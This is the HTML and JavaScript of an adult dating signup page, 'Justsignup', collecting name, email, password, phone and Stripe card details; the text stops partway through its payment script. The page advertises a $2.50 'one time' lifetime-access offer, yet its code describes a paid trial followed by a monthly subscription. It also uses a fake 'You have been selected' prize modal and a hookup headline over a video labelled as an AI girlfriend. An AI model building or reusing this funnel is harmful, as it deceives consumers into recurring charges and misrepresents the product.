<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
  <title>Justsignup</title>

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){ dataLayer.push(arguments); }
    gtag('js', new Date());
    gtag('config', 'G-FDQ6REQWS8');
  </script>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#ffffff; --card:#f8f9fc; --text:#111; --muted:#555; --line:#ddd;
      --cta1:#ffd76b; --cta2:#ffb429; --radius:16px; --green:#12b886; --red:#e03131;
    }
    *{box-sizing:border-box}
    body{ margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
          background:var(--bg); color:#111; display:flex; flex-direction:column;
          align-items:center; justify-content:flex-start; padding:18px 14px 40px;}
    .shell{ width:min(900px,100%); display:flex; flex-direction:column; gap:18px }
    .card{ width:min(720px,100%); background:var(--card); border:1px solid var(--line);
           border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05);
           margin-inline:auto;}
    .title{ font-size:30px; font-weight:900; text-align:center; margin:6px 0 12px; 
            letter-spacing:.2px; color:#e91e63; } /* pink title */
    .sub{ text-align:center; color:var(--muted); margin-top:-2px; margin-bottom:16px }

    /* Video hero (scaled bigger now) */
    .video-wrap{ position:relative; border-radius:18px; overflow:hidden; border:1px solid #eee; background:#000;
                 max-width:35%; margin:0 auto; }
    .video-wrap video{ width:100%; height:auto; display:block; }

    /* Lifetime headline */
    .lifetime-offer {
      text-align: center;
      font-size: 28px;
      font-weight: 900;
      color: #b00020;
      margin: 20px 0 10px;
    }
    .lifetime-offer .old-price {
      color: #888;
      font-size: 22px;
      font-weight: 700;
      margin-left: 10px;
      position: relative;
    }
    .lifetime-offer .old-price::after {
      content: "";
      position: absolute;
      left: -3px;
      right: -3px;
      top: 50%;
      height: 2px;
      background: linear-gradient(90deg,#c9c9c9,#999);
      transform: rotate(-6deg);
    }

    /* Pricing row */
    .pricing{ display:flex; align-items:center; justify-content:center; gap:12px; margin:12px 0 6px }
    .was{ color:#888; position:relative; font-weight:700; }
    .was::after{ content:""; position:absolute; left:-3px; right:-3px; top:50%; height:2px; background:linear-gradient(90deg,#c9c9c9,#999); transform:rotate(-6deg);}
    .now{ font-weight:900; color:#0b6b3a; background:#e9f8f0; border:1px solid #b7ecd2;
          padding:6px 10px; border-radius:10px; font-size:18px;}
    .save{ font-size:12px; color:#0b6b3a; font-weight:800; letter-spacing:.2px;
           background:#e9f8f0; border:1px dashed #9ddfbe; padding:4px 8px; border-radius:999px;}

    /* Inputs & buttons */
    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
    .input{ width:100%; padding:12px; border:1px solid #ccc; background:#fff; color:#111; border-radius:10px; font-size:16px; }
    .btn{ width:100%; border:none; color:#111; border-radius:12px; padding:12px 16px;
          font-weight:900; cursor:pointer; font-size:16px;
          background:linear-gradient(180deg,var(--cta1),var(--cta2));
          box-shadow:0 8px 18px rgba(255,174,15,.25);}
    .btn-row{ display:flex; gap:12px; margin-top:12px }
    .muted-btn{ background:#eee; color:#333; border:1px solid #ddd; }

    /* Steps */
    .step{ display:none }
    .step[aria-hidden="false"]{ display:block }

    /* Stripe Elements styling */
    .label{font-weight:700; margin:4px 0 8px; font-size:14px; color:#333}
    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; }

    .brands{display:flex; justify-content:center; gap:12px; margin:14px 0 6px}
    .brands img{height:22px}
    .trust-text{ font-size:13px; color:#666; text-align:center; margin-top:12px }

    #err{ width:100%; margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none; }
    #err[aria-hidden="false"]{ display:block; }

    /* Loading */
    .loading-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.9); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:9999; text-align:center; }
    .loading-overlay[aria-hidden="false"]{ display:flex }
    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #ddd; border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.08); padding:20px; text-align:center; }
    .loading-title{ font-weight:800; margin:2px 0 10px; color:#111 }
    .progress-wrap{ width:100%; height:10px; background:#eee; border-radius:999px; overflow:hidden; }
    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation: loadingBar 2.2s ease-in-out infinite; }
    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }

    /* ---------- Ethical promo modal ---------- */
    .promo-backdrop{
      position:fixed; inset:0; background:rgba(0,0,0,.45);
      display:none; align-items:center; justify-content:center; z-index:9998;
    }
    .promo-backdrop[aria-hidden="false"]{ display:flex; }
    .promo-modal{
      width:min(92vw,520px); background:#fff; border:1px solid var(--line);
      border-radius:18px; box-shadow:0 14px 30px rgba(0,0,0,.18);
      padding:20px; position:relative;
    }
    .promo-close{
      position:absolute; top:10px; right:10px; background:#eee; border:1px solid #ddd;
      border-radius:999px; width:34px; height:34px; display:grid; place-items:center; cursor:pointer;
    }
    .promo-title{ font-size:22px; font-weight:900; margin:6px 0 6px; text-align:center; }
    .promo-sub{ text-align:center; color:#555; margin:0 0 10px; }
    .promo-pricing{ display:flex; align-items:center; justify-content:center; gap:12px; margin:10px 0; }
    .promo-was{ color:#888; position:relative; font-weight:700; }
    .promo-was::after{ content:""; position:absolute; left:-3px; right:-3px; top:50%; height:2px; background:linear-gradient(90deg,#c9c9c9,#999); transform:rotate(-6deg);}
    .promo-now{ font-weight:900; color:#0b6b3a; background:#e9f8f0; border:1px solid #b7ecd2; padding:6px 10px; border-radius:10px; font-size:18px;}
    .promo-actions{ display:flex; gap:10px; margin-top:12px; }

    /* (Optional) tiny style for the feature list */
    .features{
      background:#fff; border:1px solid #e7e7e7; border-radius:12px; padding:12px; margin:10px 0 14px;
    }
    .features h3{ margin:0 0 8px; font-size:16px; font-weight:800; color:#222; }
    .features ul{ margin:0; padding-left:18px; }
    .features li{ margin:6px 0; }

    /* Phone prefix + number layout */
    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; }
    @media (max-width:520px){ .phone-wrap{ grid-template-columns:1fr; } }
  </style>
</head>
<body>

<!-- GoAffPro loader (keep this so the next page can track) -->
<script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>

  <!-- ---------- Ethical promo modal ---------- -->
  <div id="promo" class="promo-backdrop" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="promoTitle" aria-describedby="promoDesc">
    <div class="promo-modal">
      <button class="promo-close" id="promoClose" aria-label="Close">✕</button>
      <div id="promoTitle" class="promo-title">CONGRATULATIONS!</div>
      <p id="promoDesc" class="promo-sub">
        You have been selected to get ALL PREMIUM FEATURES worth
        <span data-price="99" data-precision="0">$99</span>
        for only
        <span data-price="2.5" data-precision="2">$2.50</span>!
      </p>
      <div class="promo-pricing">
        <span class="promo-was"><span data-price="99" data-precision="0">$99</span></span>
        <span class="promo-now">Now <span data-price="2.5" data-precision="2">$2.50</span></span>
      </div>
      <p class="promo-sub">Life Time Access: Includes unlimited messages, HD photo sharing, voice calls, and contact sharing. 18+ community. Terms apply.</p>
      <div class="promo-actions">
        <button class="btn" id="promoAccept" style="flex:1">See Premium Options</button>
        <button class="btn muted-btn" id="promoDismiss" style="flex:1">No thanks</button>
      </div>
    </div>
  </div>

  <div class="shell">

    <!-- STEP 1 -->
    <section id="step1" class="card step" aria-hidden="false">
      <h1 class="title">Girls looking for hookups!!</h1>
      <p class="sub">On time offer: Full Premium Access for $2.50!</p>

      <div class="video-wrap" aria-label="AI girlfriend video">
        <video src="video1.mp4" autoplay loop muted playsinline preload="metadata"></video>
      </div>

      <!-- Fancy pricing display -->
      <div id="pricing" class="pricing" style="margin-top:14px">
        <span class="was"><span data-price="99" data-precision="0">$99</span></span>
        <span class="now">Now <span data-price="2.5" data-precision="2">$2.50</span></span>
        <span class="save">Save 97%</span>
      </div>

      <!-- Lifetime offer headline -->
      <div class="lifetime-offer">
        ONE TIME OFFER: LIFE TIME ACCESS 
      </div>

      <div class="grid" style="margin-top:10px">
        <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required />
        <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required />
        <!-- NEW: Password field (full width, spans both columns) -->
        <input class="input" id="passwordInput" type="password" placeholder="Create a password" autocomplete="new-password" required style="grid-column: 1 / -1;" />
        <!-- NEW: Phone prefix + number -->
        <div class="phone-wrap" style="grid-column: 1 / -1;">
          <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national" />
        </div>
      </div>

      <!-- hidden defaults to satisfy /api/register -->
      <input type="hidden" id="gender" value="nonbinary"/>
      <input type="hidden" id="lookingFor" value="any"/>
      <input type="hidden" id="phone" value=""/>

      <div class="btn-row">
        <button id="nextBtn" class="btn">Next step →</button>
      </div>
      <p class="trust-text">We’ll never share your email. 100% privacy guaranteed.</p>
    </section>

    <!-- STEP 2 -->
    <section id="step2" class="card step" aria-hidden="true">
      <h2 class="title">Secure Payment</h2>
      <p class="sub">Your details are safe — powered by Stripe.</p>

      <!-- --------- WHAT YOU'LL GET --------- -->
      <div class="features" aria-label="Premium features list">
        <h3>What you'll get:</h3>
        <ul>
          <li>Unlimited messages and meetings</li>
          <li>Unlimited HD photo sharing</li>
          <li>Contact and social media sharing</li>
          <li>Gifting</li>
          <li>…and much more!</li>
        </ul>
      </div>
      <!-- ----------------------------------- -->

      <div id="gpay-button"></div>

      <div class="label">Card number</div>
      <div id="card-number" class="el"></div>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px">
        <div>
          <div class="label">Expiration</div>
          <div id="card-expiry" class="el"></div>
        </div>
        <div>
          <div class="label">CVC</div>
          <div id="card-cvc" class="el"></div>
        </div>
      </div>

      <div id="err" role="alert" aria-hidden="true"></div>

      <div class="btn-row">
        <button id="backBtn" class="btn muted-btn">← Back</button>
        <button class="btn" id="payNow">Unlock Her Now</button>
      </div>

      <div class="brands">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard">
        <img src="https://charmr.xyz/logos/amex.png" alt="Amex">
        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
      </div>

      <p class="trust-text">🔒 256-bit SSL Secured · Powered by Stripe · 30-Day Money Back Guarantee</p>
    </section>
  </div>

  <!-- Loading overlay -->
  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
    <div class="loading-box">
      <div class="loading-title">Processing your payment…</div>
      <div class="progress-wrap"><div class="progress-bar"></div></div>
      <p class="sub">Please wait, this may take a few seconds.</p>
    </div>
  </div>

  <!-- Stripe.js -->
  <script src="https://js.stripe.com/v3"></script>
  <script>
    /* ---------- Step navigation ---------- */
    const step1=document.getElementById('step1'),step2=document.getElementById('step2');
    const nameInput=document.getElementById('nameInput');
    const emailInput=document.getElementById('emailInput');
    const passwordInput=document.getElementById('passwordInput');

    async function ensureAccount() {
      const email = emailInput.value.trim();
      const password = passwordInput.value;
      if (!email || !password) { throw new Error("Please enter email and password."); }

      const payload = {
        email,
        password,
        gender: document.getElementById('gender').value || "nonbinary",
        lookingFor: document.getElementById('lookingFor').value || "any",
        phone: document.getElementById('phone').value || ""
      };

      try {
        const res = await fetch("/api/register", {
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body: JSON.stringify(payload)
        });

        // Created → good; Already exists (400) → also fine, continue
        if (res.status === 201) return true;

        const data = await res.json().catch(()=>({}));
        if (res.status === 400 && data && /exists/i.test(data.error||"")) {
          return true;
        }

        throw new Error(data?.error || "Could not create account");
      } catch (e) {
        alert(e.message || "Problem creating your account. Please try again.");
        throw e;
      }
    }

    document.getElementById('nextBtn').onclick=async()=>{ 
      if(!nameInput.value||!emailInput.value||!passwordInput.value){alert("Please enter your details");return}

      // Assemble phone into hidden field before registration (added)
      try{
        const raw = (document.getElementById('phoneNumber')?.value||'').replace(/[^\d]/g,'');
        const pref = (document.getElementById('phonePrefix')?.value||'+1').trim();
        document.getElementById('phone').value = raw ? (pref + raw) : "";
      }catch{}

      try {
        await ensureAccount(); // create account on your Render server with email+password
      } catch {
        return;
      }
      localStorage.setItem("checkout_name",nameInput.value);
      localStorage.setItem("checkout_email",emailInput.value);
      step1.setAttribute("aria-hidden","true");
      step2.setAttribute("aria-hidden","false");
      window.scrollTo({top:0,behavior:'smooth'});
    };

    document.getElementById('backBtn').onclick=()=>{ 
      step1.setAttribute("aria-hidden","false");step2.setAttribute("aria-hidden","true");
      window.scrollTo({top:0,behavior:'smooth'});
    };

    /* ---------- Currency symbol by IP (display only) ---------- */
    (function setCurrencyByIP(){
      const EU = new Set([
        'AT','BE','BG','HR','CY','CZ','DK','EE','FI','FR','DE','GR','HU','IE','IT',
        'LV','LT','LU','MT','NL','PL','PT','RO','SK','SI','ES','SE'
      ]);
      function symbolFor(cc){
        if(cc==='US') return '$';
        if(cc==='GB' || cc==='UK') return '£';
        if(EU.has(cc)) return '€';
        return '$';
      }
      function fmt(amount, precision, symbol){
        const n = Number(amount);
        const fixed = (precision != null) ? n.toFixed(Number(precision)) : (Number.isInteger(n) ? String(n) : n.toFixed(2));
        return symbol + fixed.replace(/\.00$/,'');
      }
      function apply(symbol){
        document.querySelectorAll('[data-price]').forEach(el=>{
          const amt = el.getAttribute('data-price');
          const prec = el.getAttribute('data-precision');
          el.textContent = fmt(amt, prec, symbol);
        });
      }
      apply('$');
      fetch('https://ipapi.co/json/')
        .then(r => r.ok ? r.json() : Promise.reject())
        .then(data => apply(symbolFor((data && (data.country || data.country_code)) || 'US')))
        .catch(() => {
          try {
            const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';
            const cc = (loc.split('-')[1] || 'US').toUpperCase();
            apply(symbolFor(cc));
          } catch {}
        });
    })();

    /* ---------- Phone prefix by IP (ALL countries) ---------- */
    (function phonePrefixByIP(){
      const selectEl = document.getElementById('phonePrefix');
      if(!selectEl) return;

      // Full list of countries (ISO 3166-1 alpha-2) with calling codes.
      // Source harmonized with ITU-E.164 allocations. Territories included.
      // Note: Some share codes (e.g., US/CA +1). Duplicates kept with distinct labels.
      const COUNTRIES = [
        {cc:'AF',name:'Afghanistan', code:'+93'},
        {cc:'AL',name:'Albania', code:'+355'},
        {cc:'DZ',name:'Algeria', code:'+213'},
        {cc:'AS',name:'American Samoa', code:'+1'},
        {cc:'AD',name:'Andorra', code:'+376'},
        {cc:'AO',name:'Angola', code:'+244'},
        {cc:'AI',name:'Anguilla', code:'+1'},
        {cc:'AG',name:'Antigua and Barbuda', code:'+1'},
        {cc:'AR',name:'Argentina', code:'+54'},
        {cc:'AM',name:'Armenia', code:'+374'},
        {cc:'AW',name:'Aruba', code:'+297'},
        {cc:'AU',name:'Australia', code:'+61'},
        {cc:'AT',name:'Austria', code:'+43'},
        {cc:'AZ',name:'Azerbaijan', code:'+994'},
        {cc:'BS',name:'Bahamas', code:'+1'},
        {cc:'BH',name:'Bahrain', code:'+973'},
        {cc:'BD',name:'Bangladesh', code:'+880'},
        {cc:'BB',name:'Barbados', code:'+1'},
        {cc:'BY',name:'Belarus', code:'+375'},
        {cc:'BE',name:'Belgium', code:'+32'},
        {cc:'BZ',name:'Belize', code:'+501'},
        {cc:'BJ',name:'Benin', code:'+229'},
        {cc:'BM',name:'Bermuda', code:'+1'},
        {cc:'BT',name:'Bhutan', code:'+975'},
        {cc:'BO',name:'Bolivia', code:'+591'},
        {cc:'BQ',name:'Bonaire, Sint Eustatius and Saba', code:'+599'},
        {cc:'BA',name:'Bosnia and Herzegovina', code:'+387'},
        {cc:'BW',name:'Botswana', code:'+267'},
        {cc:'BR',name:'Brazil', code:'+55'},
        {cc:'IO',name:'British Indian Ocean Territory', code:'+246'},
        {cc:'VG',name:'British Virgin Islands', code:'+1'},
        {cc:'BN',name:'Brunei', code:'+673'},
        {cc:'BG',name:'Bulgaria', code:'+359'},
        {cc:'BF',name:'Burkina Faso', code:'+226'},
        {cc:'BI',name:'Burundi', code:'+257'},
        {cc:'KH',name:'Cambodia', code:'+855'},
        {cc:'CM',name:'Cameroon', code:'+237'},
        {cc:'CA',name:'Canada', code:'+1'},
        {cc:'CV',name:'Cape Verde', code:'+238'},
        {cc:'KY',name:'Cayman Islands', code:'+1'},
        {cc:'CF',name:'Central African Republic', code:'+236'},
        {cc:'TD',name:'Chad', code:'+235'},
        {cc:'CL',name:'Chile', code:'+56'},
        {cc:'CN',name:'China', code:'+86'},
        {cc:'CX',name:'Christmas Island', code:'+61'},
        {cc:'CC',name:'Cocos (Keeling) Islands', code:'+61'},
        {cc:'CO',name:'Colombia', code:'+57'},
        {cc:'KM',name:'Comoros', code:'+269'},
        {cc:'CG',name:'Congo', code:'+242'},
        {cc:'CD',name:'Congo (DRC)', code:'+243'},
        {cc:'CK',name:'Cook Islands', code:'+682'},
        {cc:'CR',name:'Costa Rica', code:'+506'},
        {cc:'CI',name:"Côte d’Ivoire", code:'+225'},
        {cc:'HR',name:'Croatia', code:'+385'},
        {cc:'CU',name:'Cuba', code:'+53'},
        {cc:'CW',name:'Curaçao', code:'+599'},
        {cc:'CY',name:'Cyprus', code:'+357'},
        {cc:'CZ',name:'Czechia', code:'+420'},
        {cc:'DK',name:'Denmark', code:'+45'},
        {cc:'DJ',name:'Djibouti', code:'+253'},
        {cc:'DM',name:'Dominica', code:'+1'},
        {cc:'DO',name:'Dominican Republic', code:'+1'},
        {cc:'EC',name:'Ecuador', code:'+593'},
        {cc:'EG',name:'Egypt', code:'+20'},
        {cc:'SV',name:'El Salvador', code:'+503'},
        {cc:'GQ',name:'Equatorial Guinea', code:'+240'},
        {cc:'ER',name:'Eritrea', code:'+291'},
        {cc:'EE',name:'Estonia', code:'+372'},
        {cc:'SZ',name:'Eswatini', code:'+268'},
        {cc:'ET',name:'Ethiopia', code:'+251'},
        {cc:'FK',name:'Falkland Islands', code:'+500'},
        {cc:'FO',name:'Faroe Islands', code:'+298'},
        {cc:'FJ',name:'Fiji', code:'+679'},
        {cc:'FI',name:'Finland', code:'+358'},
        {cc:'FR',name:'France', code:'+33'},
        {cc:'GF',name:'French Guiana', code:'+594'},
        {cc:'PF',name:'French Polynesia', code:'+689'},
        {cc:'GA',name:'Gabon', code:'+241'},
        {cc:'GM',name:'Gambia', code:'+220'},
        {cc:'GE',name:'Georgia', code:'+995'},
        {cc:'DE',name:'Germany', code:'+49'},
        {cc:'GH',name:'Ghana', code:'+233'},
        {cc:'GI',name:'Gibraltar', code:'+350'},
        {cc:'GR',name:'Greece', code:'+30'},
        {cc:'GL',name:'Greenland', code:'+299'},
        {cc:'GD',name:'Grenada', code:'+1'},
        {cc:'GP',name:'Guadeloupe', code:'+590'},
        {cc:'GU',name:'Guam', code:'+1'},
        {cc:'GT',name:'Guatemala', code:'+502'},
        {cc:'GG',name:'Guernsey', code:'+44'},
        {cc:'GN',name:'Guinea', code:'+224'},
        {cc:'GW',name:'Guinea-Bissau', code:'+245'},
        {cc:'GY',name:'Guyana', code:'+592'},
        {cc:'HT',name:'Haiti', code:'+509'},
        {cc:'HN',name:'Honduras', code:'+504'},
        {cc:'HK',name:'Hong Kong', code:'+852'},
        {cc:'HU',name:'Hungary', code:'+36'},
        {cc:'IS',name:'Iceland', code:'+354'},
        {cc:'IN',name:'India', code:'+91'},
        {cc:'ID',name:'Indonesia', code:'+62'},
        {cc:'IR',name:'Iran', code:'+98'},
        {cc:'IQ',name:'Iraq', code:'+964'},
        {cc:'IE',name:'Ireland', code:'+353'},
        {cc:'IM',name:'Isle of Man', code:'+44'},
        {cc:'IL',name:'Israel', code:'+972'},
        {cc:'IT',name:'Italy', code:'+39'},
        {cc:'JM',name:'Jamaica', code:'+1'},
        {cc:'JP',name:'Japan', code:'+81'},
        {cc:'JE',name:'Jersey', code:'+44'},
        {cc:'JO',name:'Jordan', code:'+962'},
        {cc:'KZ',name:'Kazakhstan', code:'+7'},
        {cc:'KE',name:'Kenya', code:'+254'},
        {cc:'KI',name:'Kiribati', code:'+686'},
        {cc:'KP',name:'Korea (North)', code:'+850'},
        {cc:'KR',name:'Korea (South)', code:'+82'},
        {cc:'KW',name:'Kuwait', code:'+965'},
        {cc:'KG',name:'Kyrgyzstan', code:'+996'},
        {cc:'LA',name:'Laos', code:'+856'},
        {cc:'LV',name:'Latvia', code:'+371'},
        {cc:'LB',name:'Lebanon', code:'+961'},
        {cc:'LS',name:'Lesotho', code:'+266'},
        {cc:'LR',name:'Liberia', code:'+231'},
        {cc:'LY',name:'Libya', code:'+218'},
        {cc:'LI',name:'Liechtenstein', code:'+423'},
        {cc:'LT',name:'Lithuania', code:'+370'},
        {cc:'LU',name:'Luxembourg', code:'+352'},
        {cc:'MO',name:'Macao', code:'+853'},
        {cc:'MG',name:'Madagascar', code:'+261'},
        {cc:'MW',name:'Malawi', code:'+265'},
        {cc:'MY',name:'Malaysia', code:'+60'},
        {cc:'MV',name:'Maldives', code:'+960'},
        {cc:'ML',name:'Mali', code:'+223'},
        {cc:'MT',name:'Malta', code:'+356'},
        {cc:'MH',name:'Marshall Islands', code:'+692'},
        {cc:'MQ',name:'Martinique', code:'+596'},
        {cc:'MR',name:'Mauritania', code:'+222'},
        {cc:'MU',name:'Mauritius', code:'+230'},
        {cc:'YT',name:'Mayotte', code:'+262'},
        {cc:'MX',name:'Mexico', code:'+52'},
        {cc:'FM',name:'Micronesia', code:'+691'},
        {cc:'MD',name:'Moldova', code:'+373'},
        {cc:'MC',name:'Monaco', code:'+377'},
        {cc:'MN',name:'Mongolia', code:'+976'},
        {cc:'ME',name:'Montenegro', code:'+382'},
        {cc:'MS',name:'Montserrat', code:'+1'},
        {cc:'MA',name:'Morocco', code:'+212'},
        {cc:'MZ',name:'Mozambique', code:'+258'},
        {cc:'MM',name:'Myanmar', code:'+95'},
        {cc:'NA',name:'Namibia', code:'+264'},
        {cc:'NR',name:'Nauru', code:'+674'},
        {cc:'NP',name:'Nepal', code:'+977'},
        {cc:'NL',name:'Netherlands', code:'+31'},
        {cc:'NC',name:'New Caledonia', code:'+687'},
        {cc:'NZ',name:'New Zealand', code:'+64'},
        {cc:'NI',name:'Nicaragua', code:'+505'},
        {cc:'NE',name:'Niger', code:'+227'},
        {cc:'NG',name:'Nigeria', code:'+234'},
        {cc:'NU',name:'Niue', code:'+683'},
        {cc:'NF',name:'Norfolk Island', code:'+672'},
        {cc:'MP',name:'Northern Mariana Islands', code:'+1'},
        {cc:'NO',name:'Norway', code:'+47'},
        {cc:'OM',name:'Oman', code:'+968'},
        {cc:'PK',name:'Pakistan', code:'+92'},
        {cc:'PW',name:'Palau', code:'+680'},
        {cc:'PS',name:'Palestine', code:'+970'},
        {cc:'PA',name:'Panama', code:'+507'},
        {cc:'PG',name:'Papua New Guinea', code:'+675'},
        {cc:'PY',name:'Paraguay', code:'+595'},
        {cc:'PE',name:'Peru', code:'+51'},
        {cc:'PH',name:'Philippines', code:'+63'},
        {cc:'PN',name:'Pitcairn', code:'+64'},
        {cc:'PL',name:'Poland', code:'+48'},
        {cc:'PT',name:'Portugal', code:'+351'},
        {cc:'PR',name:'Puerto Rico', code:'+1'},
        {cc:'QA',name:'Qatar', code:'+974'},
        {cc:'RE',name:'Réunion', code:'+262'},
        {cc:'RO',name:'Romania', code:'+40'},
        {cc:'RU',name:'Russia', code:'+7'},
        {cc:'RW',name:'Rwanda', code:'+250'},
        {cc:'BL',name:'Saint Barthélemy', code:'+590'},
        {cc:'SH',name:'Saint Helena, Ascension and Tristan da Cunha', code:'+290'},
        {cc:'KN',name:'Saint Kitts and Nevis', code:'+1'},
        {cc:'LC',name:'Saint Lucia', code:'+1'},
        {cc:'MF',name:'Saint Martin (French part)', code:'+590'},
        {cc:'PM',name:'Saint Pierre and Miquelon', code:'+508'},
        {cc:'VC',name:'Saint Vincent and the Grenadines', code:'+1'},
        {cc:'WS',name:'Samoa', code:'+685'},
        {cc:'SM',name:'San Marino', code:'+378'},
        {cc:'ST',name:'Sao Tome and Principe', code:'+239'},
        {cc:'SA',name:'Saudi Arabia', code:'+966'},
        {cc:'SN',name:'Senegal', code:'+221'},
        {cc:'RS',name:'Serbia', code:'+381'},
        {cc:'SC',name:'Seychelles', code:'+248'},
        {cc:'SL',name:'Sierra Leone', code:'+232'},
        {cc:'SG',name:'Singapore', code:'+65'},
        {cc:'SX',name:'Sint Maarten (Dutch part)', code:'+1'},
        {cc:'SK',name:'Slovakia', code:'+421'},
        {cc:'SI',name:'Slovenia', code:'+386'},
        {cc:'SB',name:'Solomon Islands', code:'+677'},
        {cc:'SO',name:'Somalia', code:'+252'},
        {cc:'ZA',name:'South Africa', code:'+27'},
        {cc:'GS',name:'South Georgia & the South Sandwich Islands', code:'+500'},
        {cc:'SS',name:'South Sudan', code:'+211'},
        {cc:'ES',name:'Spain', code:'+34'},
        {cc:'LK',name:'Sri Lanka', code:'+94'},
        {cc:'SD',name:'Sudan', code:'+249'},
        {cc:'SR',name:'Suriname', code:'+597'},
        {cc:'SJ',name:'Svalbard and Jan Mayen', code:'+47'},
        {cc:'SE',name:'Sweden', code:'+46'},
        {cc:'CH',name:'Switzerland', code:'+41'},
        {cc:'SY',name:'Syria', code:'+963'},
        {cc:'TW',name:'Taiwan', code:'+886'},
        {cc:'TJ',name:'Tajikistan', code:'+992'},
        {cc:'TZ',name:'Tanzania', code:'+255'},
        {cc:'TH',name:'Thailand', code:'+66'},
        {cc:'TL',name:'Timor-Leste', code:'+670'},
        {cc:'TG',name:'Togo', code:'+228'},
        {cc:'TK',name:'Tokelau', code:'+690'},
        {cc:'TO',name:'Tonga', code:'+676'},
        {cc:'TT',name:'Trinidad and Tobago', code:'+1'},
        {cc:'TN',name:'Tunisia', code:'+216'},
        {cc:'TR',name:'Türkiye', code:'+90'},
        {cc:'TM',name:'Turkmenistan', code:'+993'},
        {cc:'TC',name:'Turks and Caicos Islands', code:'+1'},
        {cc:'TV',name:'Tuvalu', code:'+688'},
        {cc:'UG',name:'Uganda', code:'+256'},
        {cc:'UA',name:'Ukraine', code:'+380'},
        {cc:'AE',name:'United Arab Emirates', code:'+971'},
        {cc:'GB',name:'United Kingdom', code:'+44'},
        {cc:'US',name:'United States', code:'+1'},
        {cc:'UM',name:'U.S. Outlying Islands', code:'+1'},
        {cc:'UY',name:'Uruguay', code:'+598'},
        {cc:'UZ',name:'Uzbekistan', code:'+998'},
        {cc:'VU',name:'Vanuatu', code:'+678'},
        {cc:'VA',name:'Vatican City', code:'+39'},
        {cc:'VE',name:'Venezuela', code:'+58'},
        {cc:'VN',name:'Vietnam', code:'+84'},
        {cc:'VI',name:'U.S. Virgin Islands', code:'+1'},
        {cc:'WF',name:'Wallis and Futuna', code:'+681'},
        {cc:'EH',name:'Western Sahara', code:'+212'},
        {cc:'YE',name:'Yemen', code:'+967'},
        {cc:'ZM',name:'Zambia', code:'+260'},
        {cc:'ZW',name:'Zimbabwe', code:'+263'}
      ];

      function buildOptions(preferredCC, preferredCalling){
        selectEl.innerHTML = '';
        const added = new Set();

        // If API gave an exact calling code, pin it on top
        if (preferredCalling){
          const name = (COUNTRIES.find(c=>c.cc===preferredCC)?.name) || 'Your country';
          const opt = new Option(`${preferredCalling} — ${name}`, preferredCalling, true, true);
          selectEl.append(opt);
          added.add(`${preferredCalling}|${name}`);
        } else if (preferredCC){
          const item = COUNTRIES.find(c=>c.cc===preferredCC);
          if (item){
            const opt = new Option(`${item.code} — ${item.name}`, item.code, true, true);
            selectEl.append(opt);
            added.add(`${item.code}|${item.name}`);
          }
        }

        // Add the rest (all countries)
        COUNTRIES.forEach(({code,name})=>{
          const key = `${code}|${name}`;
          if (added.has(key)) return;
          selectEl.append(new Option(`${code} — ${name}`, code));
          added.add(key);
        });

        if (!selectEl.value) selectEl.value = '+1';
      }

      // Seed quickly with US so the UI isn’t empty
      try { buildOptions('US', null); } catch {}

      // Refine using IP
      fetch('https://ipapi.co/json/')
        .then(r=>r.ok?r.json():Promise.reject())
        .then(data=>{
          const cc = ((data&&(data.country||data.country_code))||'US').toUpperCase();
          const calling = (data&&data.country_calling_code)||null;
          buildOptions(cc, calling);
        })
        .catch(()=>{
          try{
            const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';
            const cc = (loc.split('-')[1]||'US').toUpperCase();
            buildOptions(cc, null);
          }catch{}
        });
    })();

    /* ---------- Stripe logic (two-step paid trial → monthly) ---------- */
    const TRIAL_INTENT_URL="https://charmr-jfmc.onrender.com/api/stripe/trial-charge-intent";
    const START_MONTHLY_URL="https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial";
    const PUBLISHABLE_KEY="pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";

    const stripe=Stripe(PUBLISHABLE_KEY),elements=stripe.elements();
    const cardNumber=elements.create("cardNumber"),cardExpiry=elements.create("cardExpiry"),cardCvc=elements.create("cardCvc");
    cardNumber.mount("#card-number");cardExpiry.mount("#card-expiry");cardCvc.mount("#card-cvc");
    const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
